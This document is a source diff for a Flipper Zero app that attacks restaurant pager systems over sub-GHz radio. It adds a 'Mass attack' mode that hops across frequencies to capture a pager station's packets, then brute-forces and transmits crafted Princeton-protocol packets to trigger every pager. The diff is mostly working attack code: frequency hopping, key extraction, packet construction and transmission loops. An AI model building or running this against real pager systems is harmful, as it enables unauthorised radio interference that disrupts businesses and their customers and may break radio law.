@@ -1,4 +1,5 @@
 #include "burger_pager.h"
+#include "protocols/_base.h"
 #include "protocols/_protocols.h"
 
 #include <furi.h>
@@ -12,8 +13,19 @@
 
 #include "helpers/string.h"
 #include "helpers/log.h"
+#include "helpers/common.h"
 
 static Attack attacks[] = {
+    {
+        .title = "Mass attack",
+        .text = "Do everything with all pagers",
+        .protocol = NULL,
+        .payload =
+            {
+                .mode = PayloadModeFindAndBruteforce,
+                .cfg = {},
+            },
+    },
     {
         .title = "TD112 Call all pagers",
         .text = "Do beep in all undoc pagers",
@@ -196,8 +208,6 @@ static void stop_blink(State* state) {
 }
 
 static void subghz_send_attack(State* state) {
-    uint16_t delay = delays[state->delay];
-    UNUSED(delay); // @TODO
     Payload* payload = &attacks[state->index].payload;
 
     const Protocol* protocol = attacks[state->index].protocol;
@@ -260,7 +270,7 @@ static void subghz_receiver_callback(
     SubGhzProtocolDecoderBase* decoder_base,
     void* _state) {
     State* state = (State*)_state;
-    Payload* payload = &attacks[state->index].payload;
+    const Protocol* protocol = attacks[state->index].protocol;
 
     if(decoder_base->protocol->type == SubGhzProtocolTypeStatic) {
         FuriString* buffer = furi_string_alloc();
@@ -268,30 +278,49 @@ static void subghz_receiver_callback(
         subghz_receiver_reset(receiver);
         FURI_LOG_I(LOGGING_TAG, "Captured:\r\n%s", furi_string_get_cstr(buffer));
 
-        const uint8_t size = 3;
-        uint8_t packet[size];
-        memset(packet, 0, size);
+        size_t packet_size = 3;
+        uint8_t packet[packet_size];
+        memset(packet, 0, packet_size);
         char* key_str = alloc_extract_value_from_string("Key", furi_string_get_cstr(buffer));
-        convert_key_to_data(key_str, packet, size);
-        UNUSED(key_str);
+        convert_key_to_data(key_str, packet, packet_size);
+        free(key_str);
 
-        FURI_LOG_D(
-            LOGGING_TAG,
-            "Success parsed captured package to %02X %02X %02X",
-            packet[0],
-            packet[1],
-            packet[2]);
+        if(protocol == NULL) {
+            for(int i = 1; i < ATTACKS_COUNT; i++) {
+                Attack* attack = &attacks[i];
+                Payload* attack_payload = &attack->payload;
+                const Protocol* attack_protocol = attack->protocol;
 
-        const Protocol* protocol = attacks[state->index].protocol;
-        protocol->process_packet(size, packet, payload);
+                if(attack_protocol) {
+                    attack_protocol->process_packet(packet_size, packet, attack_payload);
+                }
+            }
+        } else {
+            protocol->process_packet(packet_size, packet, &attacks[state->index].payload);
+        }
+
         state->packet_found = true;
     }
     subghz_receiver_reset(receiver);
 }
 
+static void get_unique_frequencies(uint32_t* unique_frequencies, size_t* unique_count) {
+    uint32_t frequencies[ATTACKS_COUNT - 1];
+
+    for(size_t i = 1; i < ATTACKS_COUNT; i++) {
+        frequencies[i - 1] = attacks[i].payload.frequency;
+    }
+
+    sort(frequencies, 0, ATTACKS_COUNT - 2, sizeof(uint32_t), compare_uint32_t);
+
+    *unique_count = extract_unique_values(
+        frequencies, sizeof(uint32_t), ATTACKS_COUNT - 1, unique_frequencies, compare_uint32_t);
+}
+
 static int32_t subghz_find_station_thread(void* _state) {
     State* state = _state;
     Payload* payload = &attacks[state->index].payload;
+    const Protocol* protocol = attacks[state->index].protocol;
 
     furi_hal_power_suppress_charge_enter();
 
@@ -300,16 +329,22 @@ static int32_t subghz_find_station_thread(void* _state) {
 
     furi_hal_subghz_reset();
     subghz_devices_load_preset(state->device, FuriHalSubGhzPresetOok650Async, NULL);
-    uint32_t frequency = subghz_devices_set_frequency(state->device, payload->frequency);
-    FURI_LOG_D(LOGGING_TAG, "Changed frequency to %lu", frequency);
+
+    bool is_hopping = protocol == NULL;
+    uint32_t set_frequency = 0;
+
+    if(!is_hopping) {
+        set_frequency = subghz_devices_set_frequency(state->device, payload->frequency);
+        FURI_LOG_D(LOGGING_TAG, "Changed frequency to %lu", set_frequency);
+    } else {
+        state->hopping_index = 0;
+        state->hopping_start_time = furi_get_tick();
+        set_frequency = subghz_devices_set_frequency(
+            state->device, state->unique_frequencies[state->hopping_index]);
+        FURI_LOG_D(LOGGING_TAG, "Hopping: Set frequency to %lu", set_frequency);
+    }
 
     furi_hal_subghz_start_async_rx(subghz_capture_callback, state);
-
-    FURI_LOG_I(
-        LOGGING_TAG,
-        "Listening for Princeton %lu-bit signals at %lu",
-        payload->bits,
-        payload->frequency);
 
     while(state->find_station_running) {
         LevelDuration level_duration;
@@ -321,6 +356,27 @@ static int32_t subghz_find_station_thread(void* _state) {
             subghz_receiver_decode(state->receiver, level, duration);
         }
 
+        if(is_hopping) {
+            uint32_t current_time = furi_get_tick();
+            if(current_time - state->hopping_start_time >= state->hopping_time_ms) {
+                furi_hal_subghz_stop_async_rx();
+
+                furi_delay_ms(5);
+
+                state->hopping_index = (state->hopping_index + 1) % state->unique_frequency_count;
+
+                set_frequency = subghz_devices_set_frequency(
+                    state->device, state->unique_frequencies[state->hopping_index]);
+                FURI_LOG_D(LOGGING_TAG, "Hopping: Changed frequency to %lu", set_frequency);
+
+                furi_delay_ms(5);
+
+                furi_hal_subghz_start_async_rx(subghz_capture_callback, state);
+
+                state->hopping_start_time = current_time;
+            }
+        }
+
         if(!state->find_station_running) {
             break;
         }
@@ -328,6 +384,8 @@ static int32_t subghz_find_station_thread(void* _state) {
 
     furi_hal_subghz_stop_async_rx();
     furi_hal_subghz_sleep();
+
+    furi_hal_power_suppress_charge_exit();
 
     return 0;
 }
@@ -343,11 +401,56 @@ static void stop_attack(State* state) {
         subghz_devices_stop_async_tx(state->device);
     }
 }
+static void
+    subghz_send_attack_with_packet(State* state, Payload* payload, uint8_t size, uint8_t* packet) {
+    FURI_LOG_I(
+        LOGGING_TAG,
+        "Sending attack with Protocol: %s, Bit: %lu, Key: %.*s, TE: %lu, Repeat: %lu",
+        payload->subghz_protocol,
+        (unsigned long)payload->bits,
+        size * 3,
+        ({
+            static char temp[256];
+            for(uint8_t i = 0; i < size; i++) {
+                snprintf(&temp[i * 3], sizeof(temp) - i * 3, "%02X ", packet[i]);
+            }
+            temp;
+        }),
+        payload->te,
+        payload->repeat);
+
+    SubGhzTransmitter* transmitter =
+        subghz_transmitter_alloc_init(state->environment, payload->subghz_protocol);
+    FlipperFormat* flipper_format = state->flipper_format;
+    flipper_format_insert_or_update_string_cstr(flipper_format, "Protocol", "Princeton");
+    flipper_format_insert_or_update_uint32(flipper_format, "Bit", &payload->bits, 1);
+    flipper_format_insert_or_update_hex(flipper_format, "Key", packet, size);
+    flipper_format_insert_or_update_uint32(flipper_format, "TE", &payload->te, 1);
+    flipper_format_insert_or_update_uint32(flipper_format, "Repeat", &payload->repeat, 1);
+    flipper_format_insert_or_update_uint32(flipper_format, "Guard_time", &payload->guard_time, 1);
+    flipper_format_rewind(flipper_format);
+
+    SubGhzProtocolStatus status = subghz_transmitter_deserialize(transmitter, flipper_format);
+    furi_assert(status == SubGhzProtocolStatusOk);
+
+    subghz_devices_load_preset(state->device, FuriHalSubGhzPresetOok650Async, NULL);
+    uint32_t frequency = subghz_devices_set_frequency(state->device, payload->frequency);
+
+    FURI_LOG_D(LOGGING_TAG, "Changed frequency to %lu", frequency);
+
+    furi_hal_power_suppress_charge_enter();
+
+    subghz_devices_start_async_tx(state->device, subghz_transmitter_yield, transmitter);
+    subghz_transmitter_free(transmitter);
+}
+
 static void start_find_and_bruteforce(State* state) {
-    uint16_t period = delays[state->delay];
-    uint32_t duration = period * 1000;
+    uint16_t period = delays[state->delay] * 1000;
+    const Protocol* protocol = attacks[state->index].protocol;
+    uint32_t duration = period * (protocol == NULL ? (ATTACKS_COUNT - 1) : 1);
     uint32_t current_time = furi_get_tick();
     uint32_t elapsed_time = current_time - state->last_switch_time;
+
     if(state->is_find_station) {
         if(state->packet_found) {
             state->packet_found = false;
@@ -375,20 +478,74 @@ static void start_find_and_bruteforce(State* state) {
                 subghz_devices_stop_async_tx(state->device);
             }
         } else {
-            subghz_send_attack(state);
+            if(protocol == NULL) {
+                for(int i = 1; i < ATTACKS_COUNT; i++) {
+                    Attack* attack = &attacks[i];
+                    Payload* attack_payload = &attack->payload;
+                    const Protocol* attack_protocol = attack->protocol;
+
+                    if(attack_protocol) {
+                        uint8_t size;
+                        uint8_t* packet;
+                        attack_protocol->make_packet(&size, &packet, attack_payload);
+
+                        subghz_send_attack_with_packet(state, attack_payload, size, packet);
+                        free(packet);
+
+                        while(!subghz_devices_is_async_complete_tx(state->device)) {
+                            furi_delay_ms(5);
+                        }
+                        subghz_devices_stop_async_tx(state->device);
+                    }
+                }
+            } else {
+                subghz_send_attack(state);
+            }
         }
     }
 }
-static void start_attack(State* state) {
-    Payload* payload = &attacks[state->index].payload;
 
-    if(payload->mode == PayloadModeFindAndBruteforce) {
+static void start_attack(State* state) {
+    const Protocol* protocol = attacks[state->index].protocol;
+
+    if(protocol == NULL) {
         start_find_and_bruteforce(state);
     } else {
-        subghz_send_attack(state);
-        state->is_find_station = false;
+        Payload* payload = &attacks[state->index].payload;
+        if(payload->mode == PayloadModeFindAndBruteforce) {
+            start_find_and_bruteforce(state);
+        } else {
+            subghz_send_attack(state);
+            state->is_find_station = false;
+        }
     }
 }
+
+static void process_bruteforce(State* state) {
+    if(attacks[state->index].protocol == NULL) {
+        for(int i = 1; i < ATTACKS_COUNT; i++) {
+            Payload* payload = &attacks[i].payload;
+            if(payload->mode == PayloadModeBruteforce ||
+               payload->mode == PayloadModeFindAndBruteforce) {
+                if(payload->bruteforce.counter++ >= payload->bruteforce.counter_limit) {
+                    payload->bruteforce.counter = 0;
+                    payload->bruteforce.value =
+                        (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
+                }
+            }
+        }
+    } else {
+        Payload* payload = &attacks[state->index].payload;
+        if((payload->mode == PayloadModeBruteforce ||
+            payload->mode == PayloadModeFindAndBruteforce) &&
+           payload->bruteforce.counter++ >= payload->bruteforce.counter_limit) {
+            payload->bruteforce.counter = 0;
+            payload->bruteforce.value =
+                (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
+        }
+    }
+}
+
 static int32_t adv_thread(void* _ctx) {
     State* state = _ctx;
     start_blink(state);
@@ -396,19 +553,10 @@ static int32_t adv_thread(void* _ctx) {
     state->is_find_station = true;
 
     while(state->advertising) {
-        Payload* payload = &attacks[state->index].payload;
-        const Protocol* protocol = attacks[state->index].protocol;
-
-        if(protocol &&
-           (payload->mode == PayloadModeBruteforce ||
-            payload->mode == PayloadModeFindAndBruteforce) &&
-           payload->bruteforce.counter++ >= payload->bruteforce.counter_limit) {
-            payload->bruteforce.counter = 0;
-            payload->bruteforce.value =
-                (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
-        }
-
+        process_bruteforce(state);
         start_attack(state);
+
+        furi_delay_ms(10);
 
         if(subghz_devices_is_async_complete_tx(state->device)) {
             subghz_devices_stop_async_tx(state->device);
@@ -807,6 +955,13 @@ int32_t init_subghz(State* state) {
     state->stream = furi_stream_buffer_alloc(sizeof(LevelDuration) * 1024, sizeof(LevelDuration));
     subghz_environment_set_protocol_registry(state->environment, &subghz_protocol_registry);
     state->receiver = subghz_receiver_alloc_init(state->environment);
+
+    state->unique_frequencies = malloc(sizeof(uint32_t) * (ATTACKS_COUNT - 1));
+    furi_assert(state->unique_frequencies != NULL);
+    get_unique_frequencies(state->unique_frequencies, &state->unique_frequency_count);
+    state->hopping_index = 0;
+    state->hopping_time_ms = 500;
+    state->hopping_start_time = furi_get_tick();
 
     return 0;
 }
